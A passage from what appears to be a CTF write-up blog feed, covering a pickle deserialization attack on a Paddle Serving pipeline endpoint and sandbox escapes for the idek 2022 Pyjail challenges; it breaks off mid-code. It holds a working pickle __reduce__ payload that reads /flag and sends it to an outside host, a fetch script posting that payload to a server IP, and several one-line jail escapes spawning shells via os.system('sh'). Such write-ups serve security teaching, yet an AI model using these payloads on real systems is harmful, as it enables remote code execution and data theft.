class="comment"># Set up 2-d lod tensor</span></span><br><span class="line">        np_lod = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tensor.lod) &gt; <span class="number">0</span>:</span><br><span class="line">            np_lod = np.array(tensor.lod).astype(int32).reshape(<span class="number">2</span>, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        np_data = <span class="literal">None</span></span><br><span class="line">        _LOGGER.info(<span class="string">&quot;proto_to_numpy, name:&#123;&#125;, type:&#123;&#125;, dims:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            tensor.name, tensor.elem_type, dims))</span><br><span class="line">        <span class="keyword">if</span> tensor.elem_type == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># VarType: INT64</span></span><br><span class="line">            np_data = np.array(tensor.int64_data).astype(int64).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># VarType: FP32</span></span><br><span class="line">            np_data = np.array(tensor.float_data).astype(float32).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># VarType: INT32</span></span><br><span class="line">            np_data = np.array(tensor.int_data).astype(int32).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">3</span>:</span><br><span class="line">            <span class="comment"># VarType: FP64</span></span><br><span class="line">            np_data = np.array(tensor.float64_data).astype(float64).reshape(</span><br><span class="line">                dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">4</span>:</span><br><span class="line">            <span class="comment"># VarType: INT16</span></span><br><span class="line">            np_data = np.array(tensor.int_data).astype(int16).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">5</span>:</span><br><span class="line">            <span class="comment"># VarType: FP16</span></span><br><span class="line">            np_data = np.array(tensor.float_data).astype(float16).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">6</span>:</span><br><span class="line">            <span class="comment"># VarType: BF16</span></span><br><span class="line">            np_data = np.array(tensor.uint32_data).astype(uint16).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">7</span>:</span><br><span class="line">            <span class="comment"># VarType: UINT8</span></span><br><span class="line">            np_data = np.array(tensor.uint32_data).astype(uint8).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">8</span>:</span><br><span class="line">            <span class="comment"># VarType: INT8</span></span><br><span class="line">            np_data = np.array(tensor.int_data).astype(int8).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">9</span>:</span><br><span class="line">            <span class="comment"># VarType: BOOL</span></span><br><span class="line">            np_data = np.array(tensor.bool_data).astype(<span class="built_in">bool</span>).reshape(dims)</span><br><span class="line">        <span class="keyword">elif</span> tensor.elem_type == <span class="number">13</span>:</span><br><span class="line">            <span class="comment"># VarType: BYTES</span></span><br><span class="line">            byte_data = BytesIO(tensor.byte_data)</span><br><span class="line">            np_data = np.load(byte_data, allow_pickle=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            _LOGGER.error(<span class="string">&quot;Sorry, the type &#123;&#125; of tensor &#123;&#125; is not supported.&quot;</span>.</span><br><span class="line">                          <span class="built_in">format</span>(tensor.elem_type, tensor.name))</span><br><span class="line">            <span class="keyword">raise</span> ValueError(</span><br><span class="line">                <span class="string">&quot;Sorry, the type &#123;&#125; of tensor &#123;&#125; is not supported.&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                    tensor.elem_type, tensor.name))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> np_data, np_lod</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>np_data = np.load(byte_data, allow_pickle=True)</code> can trigger pickle deserialization</p>
<p>Tracing its call chain is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(paddle_serving_server/pipeline)</span><br><span class="line">operator.py:1753 np_data = np.load(byte_data, allow_pickle=True)</span><br><span class="line">operator.py:1763 unpack_request_package(self, request)</span><br><span class="line">dag.py:799 unpack_func = op.unpack_request_package (in _build_dag)</span><br><span class="line">dag.py:814 build(self)</span><br><span class="line">dag.py:94 (in_channel, out_channel, pack_rpc_func,unpack_rpc_func) = self._dag.build()</span><br><span class="line">dag.py:306 dictdata, log_id, prod_errcode, prod_errinfo = self._unpack_rpc_func(rpc_request)</span><br><span class="line">dag.py:374 req_channeldata = self._pack_channeldata(rpc_request, data_id) (in call)</span><br><span class="line">pipeline_server.py:73 resp = self._dag_executor.call(request)</span><br></pre></td></tr></table></figure>

<p>It is speculated that Pickle deserialization can be triggered by constructing the <code>tensor</code> field in the request.</p>
<p>It is also known from the dockerfile that the flag is located at <code>/flag</code></p>
<p>generate <code>payload</code> file code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">PAYLOAD = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import requests</span></span><br><span class="line"><span class="string">flag = os.popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line"><span class="string">url = &#x27;&#123;VPS&#125;&#x27; + flag</span></span><br><span class="line"><span class="string">requests.get(url)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exec</span>, (PAYLOAD,)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  pickled = pickle.dumps(RCE())</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pickled)</span><br></pre></td></tr></table></figure>

<p>Final exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123; execSync &#125; from &quot;child_process&quot;;</span><br><span class="line">import &#123; readFileSync &#125; from &quot;fs&quot;;</span><br><span class="line"></span><br><span class="line">execSync(`python3 exploit.py`);</span><br><span class="line"></span><br><span class="line">const payload = readFileSync(&quot;payload&quot;).toString(&quot;base64&quot;);</span><br><span class="line"></span><br><span class="line">const resp = await fetch(&quot;http://47.88.23.73:33085/uci/prediction&quot;, &#123;</span><br><span class="line">  method: &quot;POST&quot;,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    key: [&quot;x&quot;],</span><br><span class="line">    value: [</span><br><span class="line">      &quot;0.0137, -0.1136, 0.2553, -0.0692, 0.0582, -0.0727, -0.1583, -0.0584, 0.6283, 0.4919, 0.1856, 0.0795, -0.0332&quot;,</span><br><span class="line">    ],</span><br><span class="line">    tensors: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: &quot;A&quot;,</span><br><span class="line">        elem_type: &quot;13&quot;,</span><br><span class="line">        byte_data: payload,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;);</span><br><span class="line">console.log(await resp.text());</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Clone-And-Pwn</tag>
        <tag>Pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup</title>
    <url>/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/</url>
    <content><![CDATA[<h1 id="idek-2022-CTF-Pyjail-amp-amp-Pyjail-Revenge-Writeup"><a href="#idek-2022-CTF-Pyjail-amp-amp-Pyjail-Revenge-Writeup" class="headerlink" title="idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup"></a>idek 2022* CTF Pyjail &amp;&amp; Pyjail Revenge Writeup</h1><h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail:"></a>Pyjail:</h2><p>The code looks like this</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blocklist = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>]</span><br><span class="line">DISABLE_FUNCTIONS = [<span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;breakpoint&quot;</span>, <span class="string">&quot;lambda&quot;</span>, <span class="string">&quot;help&quot;</span>]</span><br><span class="line">DISABLE_FUNCTIONS = &#123;func: <span class="literal">None</span> <span class="keyword">for</span> func <span class="keyword">in</span> DISABLE_FUNCTIONS&#125;</span><br></pre></td></tr></table></figure>

<p>There is a blocklist ban off <code>&#39;.&#39; , &#39;\\&#39;, &#39;[&#39;, &#39;]&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;, &#39;:&#39;</code>. Then there is a <code>DISABLE_FUNCTIONS</code> that registers None objects for <code>&#39;getattr&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;breakpoint&#39;, &#39;lambda&#39;, &#39;help&#39;</code> and overrides the corresponding functions in <code>__builtins__</code>. Also, the file name is <code>jail.py</code>, and the one in docker is also jail, so you can use <code>__import__(&#39;jail&#39;)</code>, but you may have to type it twice, so it’s better to use <code>__import__(__main__)</code>.<br>Also flag sets permission not to read directly and then gives a readflag, called with the argument <code>/readflag giveflag</code><br>Also, this question can be executed in multiple lines, so you can do something like emptying the blocklist as follows</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;__main__&#x27;</span>),<span class="string">&#x27;blocklist&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">jail.py  readflag.c</span></span><br><span class="line"><span class="string">$ ls /</span></span><br><span class="line"><span class="string">bin   ctf  etc   home  lib    media  opt   readflag  run   srv  tmp  var</span></span><br><span class="line"><span class="string">boot  dev  flag  kctf  lib64  mnt    proc  root      sbin  sys  usr</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;9eece9b4de9380bc3a41777a8884c185&#125;</span></span><br></pre></td></tr></table></figure>

<p>There is of course a second version that uses <code>__import__(&#39;jail&#39;)</code> to load, but it seems to have to be exploited twice</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;jail&#x27;</span>),<span class="string">&#x27;blocklist&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;jail&#x27;</span>),<span class="string">&#x27;blocklist&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;9eece9b4de9380bc3a41777a8884c185&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Pyjail-Revenge"><a href="#Pyjail-Revenge" class="headerlink" title="Pyjail Revenge:"></a>Pyjail Revenge:</h2><p>Not solved during the game Repeated after the game</p>
<p>The difference between the Revenge version and the normal version is that blocklist adds <code>blocklist</code>, <code>globals</code> and <code>compile</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blocklist = [<span class="string">&#x27;.&#x27;</span> , <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&quot;blocklist&quot;</span>, <span class="string">&quot;globals&quot;</span>, <span class="string">&quot;compile&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>You can only enter one line at a time, not multiple times, so the previous solution does not work at the moment. However, the following versions can be tried</p>
<h3 id="Method-1-remove-overlay"><a href="#Method-1-remove-overlay" class="headerlink" title="Method 1 remove overlay:"></a>Method 1 remove overlay:</h3><p><code>DISABLE_FUNCTIONS</code> registers the None objects of <code>&quot;getattr&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;breakpoint&quot;, &quot;lambda&quot;, &quot;help&quot;</code> and overrides the corresponding functions in its <code>__builtins__</code>, so just delete the overridden global variables OK<br>The global variable can pass <code>globals()</code>, <code>vars()</code>, <code>locals()</code>, etc. Of course, it can also bypass the blocklist in the form of unicode, such as <code>gloｂals</code>, so that the function in <code>DISABLE_FUNCTIONS</code> can be deleted and then called.<br>For example, first use <code>setattr</code> to cover <code>__dict__</code> of some useless classes with <code>globals()</code>, <code>vars()</code>, <code>locals()</code>, then <code>delete</code> those <code>ISABLE_FUNCTIONS</code> through delattr, and then call</p>
<p>For example:<br><code>vars()</code>, <code>locals()</code> can be used</p>
<p>Override copyright and call the breakpoint function</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(copyright,<span class="string">&#x27;__dict__&#x27;</span>,gloｂals()),<span class="built_in">delattr</span>(copyright,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">welcome!</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; setattr(copyright,&#x27;</span>__dict__<span class="string">&#x27;,vars()),delattr(copyright,&#x27;</span><span class="built_in">breakpoint</span><span class="string">&#x27;),breakpoint()</span></span><br><span class="line"><span class="string">--Return--</span></span><br><span class="line"><span class="string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;(None, None, None)</span></span><br><span class="line"><span class="string">(Pdb) import os;os.system(&#x27;</span>sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sh: 0: can&#x27;</span>t access tty; job control turned off</span><br><span class="line">$ /readflag giveflag</span><br><span class="line">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span><br><span class="line"></span><br><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(copyright,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">locals</span>()),<span class="built_in">delattr</span>(copyright,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br></pre></td></tr></table></figure>

<p>Override the license to call the breakpoint function</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(license,<span class="string">&#x27;__dict__&#x27;</span>,gloｂals()),<span class="built_in">delattr</span>(license,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">welcome!</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; setattr(license,&#x27;</span>__dict__<span class="string">&#x27;,vars()),delattr(license,&#x27;</span><span class="built_in">breakpoint</span><span class="string">&#x27;),breakpoint()</span></span><br><span class="line"><span class="string">--Return--</span></span><br><span class="line"><span class="string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;(None, None, None)</span></span><br><span class="line"><span class="string">(Pdb) import os;os.system(&#x27;</span>sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sh: 0: can&#x27;</span>t access tty; job control turned off</span><br><span class="line">$ /readflag giveflag</span><br><span class="line">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span><br><span class="line"></span><br><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(license,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">locals</span>()),<span class="built_in">delattr</span>(license,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;(<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">(Pdb) <span class="keyword">import</span> os;os.system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ /readflag giveflag</span></span><br><span class="line"><span class="string">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span></span><br></pre></td></tr></table></figure>
<p>The parameters related to coverage can be found in these:</p>
<p><a href="https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426">https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426</a><br><code>quit,copyright,exit,license,credits</code></p>
<p>Of course, because of this version, he is such a startup parameter</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> socat \</span></span><br><span class="line"><span class="language-bash">    TCP-LISTEN:1337,reuseaddr,fork,end-close \</span></span><br><span class="line"><span class="language-bash">    EXEC:<span class="string">&quot;./jail.py&quot;</span>,pty,ctty,stderr,raw,<span class="built_in">echo</span>=0</span></span><br></pre></td></tr></table></figure>

<p>So you can also delete help() and then use help() to rce again, but the remote environment may have some restrictions that may cause /tmp to disappear, /tmp is unreadable, but it can work locally</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(license,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">locals</span>()),<span class="built_in">delattr</span>(license,<span class="string">&#x27;help&#x27;</span>),<span class="built_in">help</span>()</span><br><span class="line"></span><br><span class="line">Welcome to Python <span class="number">3.8</span><span class="string">&#x27;s help utility!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If this is your first time using Python, you should definitely check out</span></span><br><span class="line"><span class="string">the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter the name of any module, keyword, or topic to get help on writing</span></span><br><span class="line"><span class="string">Python programs and using Python modules.  To quit this help utility and</span></span><br><span class="line"><span class="string">return to the interpreter, just type &quot;quit&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To get a list of available modules, keywords, symbols, or topics, type</span></span><br><span class="line"><span class="string">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span></span><br><span class="line"><span class="string">with a one-line summary of what it does; to list the modules whose name</span></span><br><span class="line"><span class="string">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">help&gt; os</span></span><br><span class="line"><span class="string">[Errno 2] No usable temporary directory found in [&#x27;</span>/tmp<span class="string">&#x27;, &#x27;</span>/var/tmp<span class="string">&#x27;, &#x27;</span>/usr/tmp<span class="string">&#x27;, &#x27;</span>/home/use<span class="string">r&#x27;]</span></span><br></pre></td></tr></table></figure>

<h3 id="Method-2-Modify-sys-path-write-the-file-and-then-import"><a href="#Method-2-Modify-sys-path-write-the-file-and-then-import" class="headerlink" title="Method 2 Modify sys.path, write the file and then import:"></a>Method 2 Modify sys.path, write the file and then import:</h3><p>It consists of the following parts</p>
<ol>
<li>Overwrite the property of <code>sys.path</code> through setattr, covering it as writable <code>/dev/shm</code></li>
<li>Then pass the file parameter of the print function <a href="https://blog.csdn.net/no_giveup/article/details/72017925">https://blog.csdn.net/no_giveup/article/details/72017925</a>, and then use open to open and write.<code>.</code> will be Replaced with <code>chr(46)</code></li>
<li>Use <code>__import__</code> to load the written file name, and then execute the code</li>
</ol>
<p>which are respectively</p>
<ol>
<li><code>setattr(__import__(&quot;sys&quot;), &quot;path&quot;, list((&quot;/dev/shm/&quot;,)))</code></li>
<li><code>print(&quot;import os&quot; + chr(10) + &quot;print(os&quot; + chr(46) + &quot;system(&#39;/readflag giveflag&#39;))&quot;, file=open(&quot;/dev/shm/exp&quot; + chr(46) + &quot;py&quot;, &quot;w&quot;))</code></li>
<li><code>__import__(&quot;exp&quot;)</code></li>
</ol>
<p>final payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;sys&quot;</span>), <span class="string">&quot;path&quot;</span>, <span class="built_in">list</span>((<span class="string">&quot;/dev/shm/&quot;</span>,))), <span class="built_in">print</span>(<span class="string">&quot;import os&quot;</span> + <span class="built_in">chr</span>(<span class="number">10</span>) + <span class="string">&quot;print(os&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;system(&#x27;/readflag giveflag&#x27;))&quot;</span>, file=<span class="built_in">open</span>(<span class="string">&quot;/dev/shm/exp&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;py&quot;</span>, <span class="string">&quot;w&quot;</span>)), <span class="built_in">__import__</span>(<span class="string">&quot;exp&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>result:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">welcome!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;sys&quot;</span>), <span class="string">&quot;path&quot;</span>, <span class="built_in">list</span>((<span class="string">&quot;/dev/shm/&quot;</span>,))), <span class="built_in">print</span>(<span class="string">&quot;import os&quot;</span> + <span class="built_in">chr</span>(<span class="number">10</span>) + <span class="string">&quot;print(os&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;system(&#x27;/readflag giveflag&#x27;))&quot;</span>, file=<span class="built_in">open</span>(<span class="string">&quot;/dev/shm/exp&quot;</span> + <span class="built_in">chr</span>(<span class="number">46</span>) + <span class="string">&quot;py&quot;</span>, <span class="string">&quot;w&quot;</span>)), <span class="built_in">__import__</span>(<span class="string">&quot;exp&quot;</span>))</span><br><span class="line">idek&#123;what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!&#125;</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(<span class="literal">None</span>, <span class="literal">None</span>, &lt;module <span class="string">&#x27;lol&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/dev/shm/exp.py&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<p>Of course, it should be caused by environmental problems. The /tmp of the remote environment is read-only, but it should be writable. If the above path is writable in tmp, the relevant payload can also be completed.</p>
<h3 id="Method-3-antigravity-hijacks-the-BROWSER-environment-variable"><a href="#Method-3-antigravity-hijacks-the-BROWSER-environment-variable" class="headerlink" title="Method 3 antigravity hijacks the BROWSER environment variable:"></a>Method 3 antigravity hijacks the BROWSER environment variable:</h3><p>And antigravity can be seen from here <a href="https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203">https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203</a></p>
<p>This solution comes from the author’s expected solution. This question is very interesting. Use setattr to overwrite the environment variable BROWSER in os.environ so that it can be executed. Track it<br><a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py">https://github.com/python/cpython/blob/main/Lib/antigravity.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">webbrowser.<span class="built_in">open</span>(<span class="string">&quot;https://xkcd.com/353/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geohash</span>(<span class="params">latitude, longitude, datedow</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Compute geohash() using the Munroe algorithm.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; geohash(37.421542, -122.085589, b&#x27;2005-05-26-10458.68&#x27;)</span></span><br><span class="line"><span class="string">    37.857713 -122.544543</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># https://xkcd.com/426/</span></span><br><span class="line">    h = hashlib.md5(datedow, usedforsecurity=<span class="literal">False</span>).hexdigest()</span><br><span class="line">    p, q = [(<span class="string">&#x27;%f&#x27;</span> % <span class="built_in">float</span>.fromhex(<span class="string">&#x27;0.&#x27;</span> + x)) <span class="keyword">for</span> x <span class="keyword">in</span> (h[:<span class="number">16</span>], h[<span class="number">16</span>:<span class="number">32</span>])]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%d%s %d%s&#x27;</span> % (latitude, p[<span class="number">1</span>:], longitude, q[<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure>

<p>Found that it called <code>webbrowser</code>, continue to track<br>You can see from here that there is <code>register_standard_browsers</code> in the open function<br><a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">url, new=<span class="number">0</span>, autoraise=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Display url using the default browser.</span></span><br><span class="line"><span class="string">    If possible, open url in a location determined by new.</span></span><br><span class="line"><span class="string">    - 0: the same browser window (the default).</span></span><br><span class="line"><span class="string">    - 1: a new browser window.</span></span><br><span class="line"><span class="string">    - 2: a new browser page (&quot;tab&quot;).</span></span><br><span class="line"><span class="string">    If possible, autoraise raises the window (the default) or not.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> _tryorder <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">with</span> _lock:</span><br><span class="line">            <span class="keyword">if</span> _tryorder <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                register_standard_browsers()</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> 